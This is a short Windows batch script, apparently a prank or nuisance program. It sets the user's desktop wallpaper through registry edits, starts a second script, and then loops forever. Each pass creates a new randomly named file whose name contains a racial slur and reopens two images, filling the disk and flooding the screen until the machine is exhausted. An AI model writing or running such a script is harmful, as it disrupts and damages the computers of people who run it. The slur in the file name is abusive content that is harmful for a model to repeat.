@ECHO on

CD C:\Users\User

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\User\Desktop\folder\Background1.png /f

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f

RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters 1 True
start proc2.bat
goto loop

:loop
echo %RANDOM% >> NIGA.%RANDOM%
start C:\Users\User\Desktop\folder\Background1.png
start C:\Users\User\Desktop\mati.png
goto loop
pause